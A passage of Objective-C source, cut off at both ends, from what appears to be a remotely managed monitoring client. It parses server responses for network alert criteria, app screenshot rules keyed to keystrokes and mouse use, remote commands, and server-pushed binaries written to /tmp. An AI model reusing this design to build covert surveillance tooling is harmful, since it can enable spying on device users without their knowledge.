        location += 10;
        // End date, must be 10 bytes
        NSString *endDate = [[NSString alloc] initWithData:[aResponseData subdataWithRange:NSMakeRange(location, 10)] encoding:NSUTF8StringEncoding];
        location += 10;
        // Start time, must be 5 bytes
        NSString *startTime = [[NSString alloc] initWithData:[aResponseData subdataWithRange:NSMakeRange(location, 5)] encoding:NSUTF8StringEncoding];
        location += 5;
        // End time, must be 5 bytes
        NSString *endTime = [[NSString alloc] initWithData:[aResponseData subdataWithRange:NSMakeRange(location, 5)] encoding:NSUTF8StringEncoding];
        location += 5;

        TemporalControl *temporalControl = [[[TemporalControl alloc] init] autorelease];
        [temporalControl setMAction:(TemporalActionControl)action];
        [temporalControl setMActionParams:params];
        [temporalControl setMCriteria:criteria];
        [temporalControl setMStartDate:startDate];
        [temporalControl setMEndDate:endDate];
        [temporalControl setMStartTime:startTime];
        [temporalControl setMEndTime:endTime];
        
        [temporalControls addObject:temporalControl];
        
        [startDate release];
        [endDate release];
        [startTime release];
        [endTime release];
        
        DLog(@"~~~~~~~~~~~~~~~parseGetTemporalControlResponse~~~~~~~~~~~~~~~");
        DLog(@"temporalControl, %@", temporalControl);
    }
    [result setMTemporalControls:temporalControls];
    
    return [result autorelease];
}

+ (GetNetworkAlertCritiriaResponse *) parseGetNetworkAlertCriteriaResponse:(NSData *) aResponseData {
    GetNetworkAlertCritiriaResponse *result = [[GetNetworkAlertCritiriaResponse alloc] init];
    int offset = [self parseServerResponseHeader:aResponseData to:result];
    NSInteger location = offset;
    DLog(@"~~~~~~~~~~~~~~~parseGetNetworkAlertCriteriaResponse~~~~~~~~~~~~~~~");

    // Count
    uint16_t count = 0;
    [aResponseData getBytes:&count range:NSMakeRange(location, sizeof(uint16_t))];
    count = ntohs(count);
    location += sizeof(uint16_t);
    DLog(@"count:%d",count);
    NSMutableArray *criterias = [NSMutableArray array];
    for (NSInteger i = 0; i < count; i++) {

        uint8_t type = 0;
        [aResponseData getBytes:&type range:NSMakeRange(location, sizeof(uint8_t))];
        location += sizeof(uint8_t);
        uint8_t alertIDSize = 0;
        [aResponseData getBytes:&alertIDSize range:NSMakeRange(location, sizeof(uint8_t))];
        location += sizeof(uint8_t);
        
        NSData *subData = [aResponseData subdataWithRange:NSMakeRange(location, alertIDSize)];
        NSString * alertID = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
        location += alertIDSize;
 
        uint8_t alertNameSize = 0;
        [aResponseData getBytes:&alertNameSize range:NSMakeRange(location, sizeof(uint8_t))];
        location += sizeof(uint8_t);
        
        subData = [aResponseData subdataWithRange:NSMakeRange(location, alertNameSize)];
        NSString * alertName = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
        location += alertNameSize;
 
        uint32_t evaluationTime = 0;
        [aResponseData getBytes:&evaluationTime range:NSMakeRange(location, sizeof(int32_t))];
        evaluationTime = ntohl(evaluationTime);
        location += sizeof(uint32_t);

        if (type == kNTDDOSAlert) {
            uint64_t noOfPacket = 0;
            [aResponseData getBytes:&noOfPacket range:NSMakeRange(location, sizeof(uint64_t))];
            noOfPacket = EndianU64_LtoB(noOfPacket);
            location += sizeof(uint64_t);
            
            uint32_t protocolCount = 0;
            [aResponseData getBytes:&protocolCount range:NSMakeRange(location, sizeof(uint32_t))];
            protocolCount = ntohl(protocolCount);
            location += sizeof(uint32_t);
            
            NSMutableArray * listOfProtocol = [NSMutableArray array];
            for (int j=0; j < protocolCount; j++) {
                uint8_t protocol = 0;
                [aResponseData getBytes:&protocol range:NSMakeRange(location, sizeof(uint8_t))];
                location += sizeof(uint8_t);
                
                [listOfProtocol addObject:[NSString stringWithFormat:@"%d",protocol]];
            }
            DLog(@"### NTAlertDDOS");
            DLog(@"AlertID:%d",[alertID integerValue]);
            DLog(@"alertName:%@",alertName);
            DLog(@"EvaluationTime:%d",evaluationTime);
            DLog(@"NumberOfPacketPerHostDDOS:%d",noOfPacket);
            DLog(@"listOfProtocol:%@",listOfProtocol);

            NTAlertDDOS * ddos = [[[NTAlertDDOS alloc]init]autorelease];
            [ddos setMNTCriteriaType:kNTDDOSAlert];
            [ddos setMAlertID:[alertID integerValue]];
            ddos.mAlertName = alertName;
            [ddos setMEvaluationTime:evaluationTime];
            [ddos setMNumberOfPacketPerHostDDOS:noOfPacket];
            [ddos setMProtocol:listOfProtocol];
            
            [criterias addObject:ddos];
            
        }else if (type == kNTSpambotAlert) {
        
            uint64_t noOfPacket = 0;
            [aResponseData getBytes:&noOfPacket range:NSMakeRange(location, sizeof(uint64_t))];
            noOfPacket = EndianU64_LtoB(noOfPacket);
            location += sizeof(uint64_t);
            
            uint32_t portCount = 0;
            [aResponseData getBytes:&portCount range:NSMakeRange(location, sizeof(uint32_t))];
            portCount = ntohl(portCount);
            location += sizeof(uint32_t);
            
            NSMutableArray * listOfPort = [NSMutableArray array];
            for (int j=0; j < portCount; j++) {
                uint32_t port = 0;
                [aResponseData getBytes:&port range:NSMakeRange(location, sizeof(uint32_t))];
                port = ntohl(port);
                location += sizeof(uint32_t);

                [listOfPort addObject:[NSString stringWithFormat:@"%d",port]];
            }
        
            uint32_t hostCount = 0;
            [aResponseData getBytes:&hostCount range:NSMakeRange(location, sizeof(uint32_t))];
            hostCount = ntohl(hostCount);
            location += sizeof(uint32_t);
            
            NSMutableArray * listOfHost= [NSMutableArray array];
            for (int j=0; j < hostCount; j++) {
                NTHostNameStructure * hostStructure = [[NTHostNameStructure alloc]init];
                
                uint16_t hostNameSize = 0;
                [aResponseData getBytes:&hostNameSize range:NSMakeRange(location, sizeof(uint16_t))];
                hostNameSize = htons(hostNameSize);
                location += sizeof(uint16_t);
                
                subData = [aResponseData subdataWithRange:NSMakeRange(location, hostNameSize)];
                NSString * hostName = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
                location += hostNameSize;
                
                uint8_t IPV4Size = 0;
                [aResponseData getBytes:&IPV4Size range:NSMakeRange(location, sizeof(uint8_t))];
                location += sizeof(uint8_t);
                
                subData = [aResponseData subdataWithRange:NSMakeRange(location, IPV4Size)];
                NSString * IPV4 = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
                location += IPV4Size;

                [hostStructure setMHostName:hostName];
                [hostStructure setMIPV4:IPV4];
                
                [listOfHost addObject:hostStructure];
                
                [hostName release];
                [IPV4 release];
                [hostStructure release];
            }
        
            DLog(@"### NTAlertSpambot");
            DLog(@"AlertID:%d",[alertID integerValue]);
            DLog(@"alertName:%@",alertName);
            DLog(@"EvaluationTime:%d",evaluationTime);
            DLog(@"NumberOfPacketPerHostDDOS:%d",noOfPacket);
            DLog(@"listOfPort:%@",listOfPort);
            DLog(@"listOfHost:%@",listOfHost);
        
            NTAlertSpambot * spambot = [[[NTAlertSpambot alloc]init]autorelease];
            [spambot setMNTCriteriaType:kNTSpambotAlert];
            [spambot setMAlertID:[alertID integerValue]];
            spambot.mAlertName = alertName;
            [spambot setMEvaluationTime:evaluationTime];
            [spambot setMNumberOfPacketPerHostSpambot:noOfPacket];
            [spambot setMPort:listOfPort];
            [spambot setMListHostname:listOfHost];
        
            [criterias addObject:spambot];
            
        }else if (type == kNTBandwidthAlert) {
            
            uint64_t maxDownload = 0;
            [aResponseData getBytes:&maxDownload range:NSMakeRange(location, sizeof(uint64_t))];
            maxDownload = EndianU64_LtoB(maxDownload);
            location += sizeof(uint64_t);
            
            uint64_t maxUpload = 0;
            [aResponseData getBytes:&maxUpload range:NSMakeRange(location, sizeof(uint64_t))];
            maxUpload = EndianU64_LtoB(maxUpload);
            location += sizeof(uint64_t);
            
            uint32_t hostCount = 0;
            [aResponseData getBytes:&hostCount range:NSMakeRange(location, sizeof(uint32_t))];
            hostCount = ntohl(hostCount);
            location += sizeof(uint32_t);
            
            NSMutableArray * listOfHost= [NSMutableArray array];
            for (int j=0; j < hostCount; j++) {
                NTHostNameStructure * hostStructure = [[NTHostNameStructure alloc]init];
                
                uint16_t hostNameSize = 0;
                [aResponseData getBytes:&hostNameSize range:NSMakeRange(location, sizeof(uint16_t))];
                hostNameSize = htons(hostNameSize);
                location += sizeof(uint16_t);
                
                subData = [aResponseData subdataWithRange:NSMakeRange(location, hostNameSize)];
                NSString * hostName = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
                location += hostNameSize;
                
                uint8_t IPV4Size = 0;
                [aResponseData getBytes:&IPV4Size range:NSMakeRange(location, sizeof(uint8_t))];
                location += sizeof(uint8_t);
                
                subData = [aResponseData subdataWithRange:NSMakeRange(location, IPV4Size)];
                NSString * IPV4 = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
                location += IPV4Size;
                
                [hostStructure setMHostName:hostName];
                [hostStructure setMIPV4:IPV4];
                
                [listOfHost addObject:hostStructure];
                
                [hostName release];
                [IPV4 release];
                [hostStructure release];
            }
            
            DLog(@"### NTAlertBandwidth");
            DLog(@"AlertID:%d",[alertID integerValue]);
            DLog(@"alertName:%@",alertName);
            DLog(@"EvaluationTime:%d",evaluationTime);
            DLog(@"maxDownload:%d",maxDownload);
            DLog(@"maxUpload:%d",maxUpload);
            DLog(@"listOfHost:%@",listOfHost);

            NTAlertBandwidth * bandwidth = [[[NTAlertBandwidth alloc]init]autorelease];
            [bandwidth setMNTCriteriaType:kNTBandwidthAlert];
            [bandwidth setMAlertID:[alertID integerValue]];
            bandwidth.mAlertName = alertName;
            [bandwidth setMEvaluationTime:evaluationTime];
            [bandwidth setMMaxDownload:maxDownload];
            [bandwidth setMMaxUpload:maxUpload];
            [bandwidth setMListHostname:listOfHost];
            
            [criterias addObject:bandwidth];
            
        }else if (type == kNTChatterAlert) { // Botnet
            
            uint32_t noOfUniqueHost = 0;
            [aResponseData getBytes:&noOfUniqueHost range:NSMakeRange(location, sizeof(uint32_t))];
            noOfUniqueHost = ntohl(noOfUniqueHost);
            location += sizeof(uint32_t);

            DLog(@"### NTAlertChatter");
            DLog(@"AlertID:%d",[alertID integerValue]);
            DLog(@"alertName:%@",alertName);
            DLog(@"EvaluationTime:%d",evaluationTime);
            DLog(@"setMNumberOfUniqueHost:%d",noOfUniqueHost);
            
            NTAlertChatter * chatter = [[[NTAlertChatter alloc]init]autorelease];
            [chatter setMNTCriteriaType:kNTChatterAlert];
            [chatter setMAlertID:[alertID integerValue]];
            chatter.mAlertName = alertName;
            [chatter setMEvaluationTime:evaluationTime];
            [chatter setMNumberOfUniqueHost:noOfUniqueHost];
            
            [criterias addObject:chatter];
            
        }else if (type == kNTPortAlert) {
            uint8_t portOption = 0;
            [aResponseData getBytes:&portOption range:NSMakeRange(location, sizeof(uint8_t))];
            location += sizeof(uint8_t);

            uint32_t waitTime = 0;
            [aResponseData getBytes:&waitTime range:NSMakeRange(location, sizeof(uint32_t))];
            waitTime = ntohl(waitTime);
            location += sizeof(uint32_t);
            
            uint32_t portCount = 0;
            [aResponseData getBytes:&portCount range:NSMakeRange(location, sizeof(uint32_t))];
            portCount = ntohl(portCount);
            location += sizeof(uint32_t);
            
            NSMutableArray * listOfPort = [NSMutableArray array];
            for (int j=0; j < portCount; j++) {
                uint32_t port = 0;
                [aResponseData getBytes:&port range:NSMakeRange(location, sizeof(uint32_t))];
                port = ntohl(port);
                location += sizeof(uint32_t);
                
                [listOfPort addObject:[NSString stringWithFormat:@"%d",port]];
            }
            
            DLog(@"### NTAlertPort");
            DLog(@"AlertID:%d",[alertID integerValue]);
            DLog(@"alertName:%@",alertName);
            DLog(@"EvaluationTime:%d",evaluationTime);
            DLog(@"portOption:%d",portOption);
            DLog(@"waitTime:%d",waitTime);
            DLog(@"listOfPort:%@",listOfPort);
            
            NTAlertPort * alertPort = [[[NTAlertPort alloc]init]autorelease];
            [alertPort setMNTCriteriaType:kNTPortAlert];
            [alertPort setMAlertID:[alertID integerValue]];
            alertPort.mAlertName = alertName;
            [alertPort setMEvaluationTime:evaluationTime];
            if (portOption == 1) {
                [alertPort setMInclude:YES];
            }else if (portOption == 2) {
                [alertPort setMInclude:NO];
            }
            [alertPort setMWaitTime:waitTime];
            [alertPort setMPort:listOfPort];
            
            [criterias addObject:alertPort];
        }
        [alertID release];
        [alertName release];
    }
    if (count == 0) {
        [result setMCriteria:nil];
    }else{
        [result setMCriteria:criterias];
    }
    DLog(@"### LET ME SEE %@",criterias);
    
    return [result autorelease];
}

+ (GetAppScreenShotRuleResponse *) parseGetAppScreenShotRuleResponse:(NSData *) aResponseData;{
    GetAppScreenShotRuleResponse *result = [[GetAppScreenShotRuleResponse alloc] init];
    NSMutableArray * appScreenShotRule = [[NSMutableArray alloc]init];
    
    int offset = [self parseServerResponseHeader:aResponseData to:result];
    NSInteger location = offset;
    DLog(@"~~~~~~~~~~~~~~~parseGetAppScreenShotRuleResponse~~~~~~~~~~~~~~~");
    
    // Count
    uint16_t count = 0;
    [aResponseData getBytes:&count range:NSMakeRange(location, sizeof(uint16_t))];
    count = ntohs(count);
    location += sizeof(uint16_t);
    DLog(@"count:%d",count);
    
    for (int i=0; i < count; i++) {
        AppScreenRule * rule = [[AppScreenRule alloc]init];
        
        uint16_t applicationIDSize = 0;
        [aResponseData getBytes:&applicationIDSize range:NSMakeRange(location, sizeof(uint16_t))];
        applicationIDSize = htons(applicationIDSize);
        location += sizeof(uint16_t);
        
        NSData *subData = [aResponseData subdataWithRange:NSMakeRange(location, applicationIDSize)];
        NSString * applicationID = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
        location += applicationIDSize;
        
        uint16_t frequency = 0;
        [aResponseData getBytes:&frequency range:NSMakeRange(location, sizeof(uint16_t))];
        frequency = htons(frequency);
        location += sizeof(uint16_t);
        
        int8_t applicationCategory = 0;
        [aResponseData getBytes:&applicationCategory range:NSMakeRange(location, sizeof(int8_t))];
        location += sizeof(int8_t);
        
        [rule setMApplicationID:applicationID];
        [rule setMFrequency:frequency];
        [rule setMAppType:applicationCategory];
        
        DLog(@"### applicationID:%@",applicationID);
        DLog(@"### frequency:%d",frequency);
        DLog(@"### applicationCategory:%d",applicationCategory);
        
        [applicationID release];
        
        uint16_t paramCount = 0;
        [aResponseData getBytes:&paramCount range:NSMakeRange(location, sizeof(uint16_t))];
        paramCount = htons(paramCount);
        location += sizeof(uint16_t);
        
        DLog(@"paramCount :%d",paramCount);
        NSMutableArray * params = [[NSMutableArray alloc] init];
        for (int j=0; j < paramCount; j++) {
            AppScreenParameter * param = [[AppScreenParameter alloc] init];
            
            if (applicationCategory == kBrowser) {
                uint16_t domainNameSize = 0;
                [aResponseData getBytes:&domainNameSize range:NSMakeRange(location, sizeof(uint16_t))];
                domainNameSize = htons(domainNameSize);
                location += sizeof(uint16_t);
                
                subData = [aResponseData subdataWithRange:NSMakeRange(location, domainNameSize)];
                NSString * domainName = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
                location += domainNameSize;
                [param setMDomainName:domainName];
                
                DLog(@"# domainName:%@",domainName);
                
                [domainName release];
            }
            
            
            uint16_t titleSize = 0;
            [aResponseData getBytes:&titleSize range:NSMakeRange(location, sizeof(uint16_t))];
            titleSize = htons(titleSize);
            location += sizeof(uint16_t);
    
            subData = [aResponseData subdataWithRange:NSMakeRange(location, titleSize)];
            NSString * title = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
            location += titleSize;

            [param setMTitle:title];
            
            DLog(@"# title:%@",title);
            
            [title release];
            
            [params addObject:param];
            
            [param release];
        }
        [rule setMParameter:params];
        [appScreenShotRule addObject:rule];
        [params release];
        [rule release];
    }
    
    [result setMAppScreenShotRule:appScreenShotRule];
    
    return [result autorelease];
}

+ (GetAppScreenShotRuleResponse *) parseGetAppScreenShotRuleResponseV13:(NSData *) aResponseData;{
    GetAppScreenShotRuleResponse *result = [[GetAppScreenShotRuleResponse alloc] init];
    NSMutableArray * appScreenShotRule = [[NSMutableArray alloc]init];
    
    int offset = [self parseServerResponseHeader:aResponseData to:result];
    NSInteger location = offset;
    DLog(@"~~~~~~~~~~~~~~~parseGetAppScreenShotRuleResponseV13~~~~~~~~~~~~~~~");
    
    // Count
    uint16_t count = 0;
    [aResponseData getBytes:&count range:NSMakeRange(location, sizeof(uint16_t))];
    count = ntohs(count);
    location += sizeof(uint16_t);
    DLog(@"count:%d",count);
    
    for (int i=0; i < count; i++) {
        AppScreenRule * rule = [[AppScreenRule alloc] init];
        
        uint16_t applicationIDSize = 0;
        [aResponseData getBytes:&applicationIDSize range:NSMakeRange(location, sizeof(uint16_t))];
        applicationIDSize = htons(applicationIDSize);
        location += sizeof(uint16_t);
        
        NSData *subData = [aResponseData subdataWithRange:NSMakeRange(location, applicationIDSize)];
        NSString * applicationID = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
        location += applicationIDSize;
        
        int8_t applicationCategory = 0;
        [aResponseData getBytes:&applicationCategory range:NSMakeRange(location, sizeof(int8_t))];
        location += sizeof(int8_t);
        
        uint8_t screenshotCategory = 0;
        [aResponseData getBytes:&screenshotCategory range:NSMakeRange(location, sizeof(uint8_t))];
        location += sizeof(uint8_t);
        
        uint32_t frequency = 0;
        [aResponseData getBytes:&frequency range:NSMakeRange(location, sizeof(uint32_t))];
        frequency = ntohl(frequency);
        location += sizeof(uint32_t);
        
        uint32_t key = 0;
        [aResponseData getBytes:&key range:NSMakeRange(location, sizeof(uint32_t))];
        key = ntohl(key);
        location += sizeof(uint32_t);
        
        uint32_t mouse = 0;
        [aResponseData getBytes:&mouse range:NSMakeRange(location, sizeof(uint32_t))];
        mouse = ntohl(mouse);
        location += sizeof(uint32_t);
        
        [rule setMApplicationID:applicationID];
        [rule setMAppType:(AppType)applicationCategory];
        [rule setMScreenshotType:(ScreenshotType)screenshotCategory];
        [rule setMFrequency:frequency];
        [rule setMKey:key];
        [rule setMMouse:mouse];
        
        DLog(@"### applicationID:%@",applicationID);
        DLog(@"### screenshotCategory:%d",screenshotCategory);
        DLog(@"### applicationCategory:%d",applicationCategory);
        DLog(@"### frequency:%d",frequency);
        DLog(@"### key:%d",key);
        DLog(@"### mouse:%d",mouse);
        
        [applicationID release];
        
        uint16_t paramCount = 0;
        [aResponseData getBytes:&paramCount range:NSMakeRange(location, sizeof(uint16_t))];
        paramCount = htons(paramCount);
        location += sizeof(uint16_t);
        DLog(@"paramCount :%d",paramCount);
        
        NSMutableArray * params = [[NSMutableArray alloc] init];
        for (int j = 0; j < paramCount; j++) {
            AppScreenParameter * param = [[AppScreenParameter alloc] init];
            
            if (applicationCategory == kBrowser) {
                // Domain name
                uint16_t domainNameSize = 0;
                [aResponseData getBytes:&domainNameSize range:NSMakeRange(location, sizeof(uint16_t))];
                domainNameSize = htons(domainNameSize);
                location += sizeof(uint16_t);
                
                subData = [aResponseData subdataWithRange:NSMakeRange(location, domainNameSize)];
                NSString * domainName = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
                location += domainNameSize;
                [param setMDomainName:domainName];
                DLog(@"# domainName:%@",domainName);
                
                [domainName release];
                
                // Titles
                uint16_t titleCount = 0;
                [aResponseData getBytes:&titleCount range:NSMakeRange(location, sizeof(uint16_t))];
                titleCount = htons(titleCount);
                location += sizeof(uint16_t);
                DLog(@"titleCount :%d", titleCount);
                
                NSMutableArray *titles = [NSMutableArray arrayWithCapacity:1];
                for (int k = 0; k < titleCount; k++) {
                    uint16_t titleSize = 0;
                    [aResponseData getBytes:&titleSize range:NSMakeRange(location, sizeof(uint16_t))];
                    titleSize = htons(titleSize);
                    location += sizeof(uint16_t);
                    
                    subData = [aResponseData subdataWithRange:NSMakeRange(location, titleSize)];
                    NSString * title = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
                    location += titleSize;
                    
                    DLog(@"# title:%@",title);
                    [titles addObject:title];
                    
                    [title release];
                }
                
                [param setMTitles:titles];
            }
            else { // kNon_Browser
                // Title
                uint16_t titleSize = 0;
                [aResponseData getBytes:&titleSize range:NSMakeRange(location, sizeof(uint16_t))];
                titleSize = htons(titleSize);
                location += sizeof(uint16_t);
                
                subData = [aResponseData subdataWithRange:NSMakeRange(location, titleSize)];
                NSString * title = [[NSString alloc] initWithData:subData encoding:NSUTF8StringEncoding];
                location += titleSize;
                
                DLog(@"# title:%@",title);
                [param setMTitle:title];
                
                [title release];
            }
            
            [params addObject:param];
            
            [param release];
        }
        [rule setMParameter:params];
        [appScreenShotRule addObject:rule];
        [params release];
        [rule release];
    }
    
    [result setMAppScreenShotRule:appScreenShotRule];
    
    return [result autorelease];
}

+ (SendNetworkAlertResponse *) parseSendNetworkAlertResponse: (NSData *) aResponseData {
    SendNetworkAlertResponse *result = [[SendNetworkAlertResponse alloc] init];
    [self parseServerResponseHeader:aResponseData to:result];
    return [result autorelease];
}

#pragma mark -
#pragma mark Server response which is a file
+ (id) parseFileResponse: (NSString *) aResponseFilePath offset: (unsigned long) aOffset {
	NSFileHandle * fileHandle = [NSFileHandle fileHandleForReadingAtPath:aResponseFilePath];
	if (fileHandle == nil) {
		// Return transport error
		DLog(@"File handle is nil");
		
		return nil;
	}
	[fileHandle seekToFileOffset:aOffset];
	
	// 1. Get reponse (HEADER)
	// 2. Get reponse data (BODY)
	
	ResponseData *response = [ProtocolParser parseFileResponse:fileHandle];
	
	id result = nil;
	switch ([response cmdEcho]) {
		case GET_APPLICATION_PROFILE:
			result = [ProtocolParser parseGetApplicationProfileResponseData:fileHandle filePath:aResponseFilePath];
			[fileHandle closeFile];
			break;
		case GET_URL_PROFILE:
			result = [ProtocolParser parseGetUrlProfileResponseData:fileHandle filePath:aResponseFilePath];
			[fileHandle closeFile];
			break;
		case GET_BINARY:
			result = [ProtocolParser parseGetBinaryResponseData:fileHandle filePath:aResponseFilePath];
			[fileHandle closeFile];
			NSFileManager *fileManager = [NSFileManager defaultManager];
			[fileManager removeItemAtPath:aResponseFilePath error:nil];
			break;
		default:
			break;
	}
	if (result) {
		[result setPCCCount:[response PCCCount]];
		[result setPCCArray:[response PCCArray]];
		[result setServerID:[response serverID]];
		[result setCmdEcho:[response cmdEcho]];
		[result setStatusCode:[response statusCode]];
		[result setMessage:[response message]];
		[result setExtendedStatus:[response extendedStatus]];
	} else {
		result = response;
	}

	return (result);
}

#pragma mark -
#pragma mark Server response which is a file (private functions)
+ (ResponseData *) parseFileResponse: (NSFileHandle *) aFileHandle {
	NSData *serverIdData;
	NSData *cmdEchoData;
	NSData *statusCodeData;
	NSData *msgSizeData;
	NSData *msgData;
	NSData *extendedStatusData;
	NSData *PCCCountData;
	NSData *PCCCommandIDData;
	NSData *PCCArgCountData;
	NSData *PCCArgLengthData;
	NSData *PCCArgData;
	int16_t serverId;
	int16_t cmdEcho;
	int16_t statusCode;
	int16_t msgSize;
	NSString *msg;
	int32_t extendedStatus;
	
	int8_t PCCCount;
	NSMutableArray *PCCArray = [NSMutableArray array];
	int16_t cmdId;
	int8_t argumentCount;
	int16_t argumentLength;
	
	serverIdData = [aFileHandle readDataOfLength:2];
	cmdEchoData = [aFileHandle readDataOfLength:2];
	statusCodeData = [aFileHandle readDataOfLength:2];
	msgSizeData = [aFileHandle readDataOfLength:2];
	[msgSizeData getBytes:&msgSize length:sizeof(msgSize)];
	msgSize = ntohs(msgSize);
	msgData = [aFileHandle readDataOfLength:msgSize];
	extendedStatusData = [aFileHandle readDataOfLength:4];
	
	PCCCountData = [aFileHandle readDataOfLength:1];
	[PCCCountData getBytes:&PCCCount length:sizeof(PCCCount)];
	
	for (int i=0; i<PCCCount; i++) {
		PCC *pcc = [[PCC alloc] init];
		PCCCommandIDData = [aFileHandle readDataOfLength:2];
		[PCCCommandIDData getBytes:&cmdId length:sizeof(cmdId)];
		cmdId = ntohs(cmdId);
		
		[pcc setArguments:[NSMutableArray array]];
		[pcc setPCCID:cmdId];
		
		PCCArgCountData = [aFileHandle readDataOfLength:1];
		[PCCArgCountData getBytes:&argumentCount length:sizeof(argumentCount)];
		
		for (int j=0; j<argumentCount;j++) {
			PCCArgLengthData = [aFileHandle readDataOfLength:2];
			[PCCArgLengthData getBytes:&argumentLength length:sizeof(argumentLength)];
			argumentLength = ntohs(argumentLength);
			
			PCCArgData = [aFileHandle readDataOfLength:argumentLength];
			NSString *argument = [[NSString alloc] initWithData:PCCArgData encoding:NSUTF8StringEncoding];
			[[pcc arguments] addObject:argument];
			[argument release];
		}
		
		[PCCArray addObject:pcc];
		[pcc release];
	}
	
	
	[serverIdData getBytes:&serverId length:sizeof(serverId)];
	[cmdEchoData getBytes:&cmdEcho length:sizeof(cmdEcho)];
	[statusCodeData getBytes:&statusCode length:sizeof(statusCode)];
	msg = [[NSString alloc] initWithData:msgData encoding:NSUTF8StringEncoding];
	[extendedStatusData getBytes:&extendedStatus length:sizeof(extendedStatus)];
	serverId = ntohs(serverId);
	cmdEcho = ntohs(cmdEcho);
	statusCode = ntohs(statusCode);
	ResponseData *result = [[ResponseData alloc] init];
	[result setPCCCount:PCCCount];
	[result setPCCArray:PCCArray];
	[result setServerID:serverId];
	[result setCmdEcho:cmdEcho];
	[result setStatusCode:statusCode];
	[result setMessage:msg];
	[result setExtendedStatus:extendedStatus];
	[msg release];
	[result autorelease];
	return (result);
}

+ (GetApplicationProfileResponse *) parseGetApplicationProfileResponseData: (NSFileHandle *) aResponseFileHandle
																  filePath: (NSString *) aFilePath {
	GetApplicationProfileResponse * response = [[GetApplicationProfileResponse alloc] init];
	ApplicationProfile *applicationProfile = [[ApplicationProfile alloc] init];
	
	uint8_t policy = 0;
	uint8_t profileNameSize = 0;
	NSString *profileName = nil;
	
	NSData *someData = [aResponseFileHandle readDataOfLength:1];
	[someData getBytes:&policy length:sizeof(uint8_t)];
	DLog (@"policy (0 allow/ 1 disallow) %d", policy)
	
	someData = [aResponseFileHandle readDataOfLength:1];
	[someData getBytes:&profileNameSize length:sizeof(uint8_t)];
	someData = [aResponseFileHandle readDataOfLength:profileNameSize];
	profileName = [[NSString alloc] initWithData:someData encoding:NSUTF8StringEncoding];
	DLog (@"profileName: %@", profileName)
	
	[applicationProfile setMPolicy:policy];
	[applicationProfile setMProfileName:profileName];
	[profileName release];
	
	ResponseApplicationProfileProvider *applicationProfileProvider = 
						[[ResponseApplicationProfileProvider alloc] initWithFilePath:aFilePath
																			  offset:[aResponseFileHandle offsetInFile]];
	[applicationProfile setMAllowAppsProvider:applicationProfileProvider];
	[applicationProfile setMDisAllowAppsProvider:applicationProfileProvider];
	[applicationProfileProvider release];
	
	[response setMApplicationProfile:applicationProfile];
	[applicationProfile release];
	return ([response autorelease]);
}

+ (GetUrlProfileResponse *) parseGetUrlProfileResponseData: (NSFileHandle *) aResponseFileHandle
												  filePath: (NSString *) aFilePath {
	GetUrlProfileResponse * response = [[GetUrlProfileResponse alloc] init];
	UrlProfile *urlProfile = [[UrlProfile alloc] init];
	
	uint8_t policy = 0;
	uint8_t profileNameSize = 0;
	NSString *profileName = nil;
	
	NSData *someData = [aResponseFileHandle readDataOfLength:1];
	[someData getBytes:&policy length:sizeof(uint8_t)];
	DLog (@"policy %d", policy)
	
	someData = [aResponseFileHandle readDataOfLength:1];
	[someData getBytes:&profileNameSize length:sizeof(uint8_t)];
	someData = [aResponseFileHandle readDataOfLength:profileNameSize];
	profileName = [[NSString alloc] initWithData:someData encoding:NSUTF8StringEncoding];
	DLog (@"profileName %@", profileName)
	
	[urlProfile setMPolicy:policy];
	[urlProfile setMProfileName:profileName];
	
	[profileName release];
	
	ResponseUrlProfileProvider *urlProfileProvider = 
			[[ResponseUrlProfileProvider alloc] initWithFilePath:aFilePath
															offset:[aResponseFileHandle offsetInFile]];
	[urlProfile setMAllowUrlsProvider:urlProfileProvider];
	[urlProfile setMDisAllowUrlsProvider:urlProfileProvider];
	[urlProfileProvider release];
	
	[response setMUrlProfile:urlProfile];
	[urlProfile release];
	return ([response autorelease]);	
}

+ (GetBinaryResponse *) parseGetBinaryResponseData: (NSFileHandle *) aResponseFileHandle
										  filePath: (NSString *) aFilePath {
	GetBinaryResponse *response = [[GetBinaryResponse alloc] init];
	uint8_t binaryNameSize = 0;
	NSString *binaryName = nil;
	uint32_t crc32 = 0;
	uint32_t binarySize = 0;
	id binary = nil;
	
	NSData *someData = [aResponseFileHandle readDataOfLength:sizeof(uint8_t)];
	[someData getBytes:&binaryNameSize length:sizeof(uint8_t)];	
	DLog (@"1 binary name size %d", binaryNameSize)
	
	someData = [aResponseFileHandle readDataOfLength:binaryNameSize];
	binaryName = [[NSString alloc] initWithData:someData encoding:NSUTF8StringEncoding];
	DLog (@"2 binary name %@", binaryName)
	
	someData = [aResponseFileHandle readDataOfLength:sizeof(uint32_t)];
	[someData getBytes:&crc32 length:sizeof(uint32_t)];
	crc32 = ntohl(crc32);
	DLog (@"3 crc32 %ul", crc32)		
	
	someData = [aResponseFileHandle readDataOfLength:sizeof(uint32_t)];
	[someData getBytes:&binarySize length:sizeof(uint32_t)];		
	DLog (@"4 binarySize (before convert) %u", binarySize)
	binarySize = ntohl(binarySize);
	DLog (@"4 binarySize (after convert) %u", binarySize)
	
	uint32_t fivemb = pow(1024, 2) * 5;	// 5 M
	
	if (binarySize > fivemb) {
		// set binary as NSString of a path
		DLog (@"set binary as NSString of a path")
		
		binary = [NSString stringWithFormat:@"/tmp/%@", binaryName];
		DLog (@"binary %@", binary)
		
		someData = [NSData data];		
		BOOL isSuccess = [someData writeToFile:binary atomically:YES];
		if (!isSuccess) {
			DLog (@"isSuccess to write %d", isSuccess)
		}
		
		NSFileHandle *binaryFileHandle = [NSFileHandle fileHandleForWritingAtPath:binary];
		
		NSUInteger megabyte = pow(1024, 2);
		while (1) {
			NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
			NSData *bytes = [aResponseFileHandle readDataOfLength:megabyte]; // Use local variable to allocate 1 mb
			NSInteger size = [bytes length];
			DLog (@"bytes length %ld", (long)size)
			
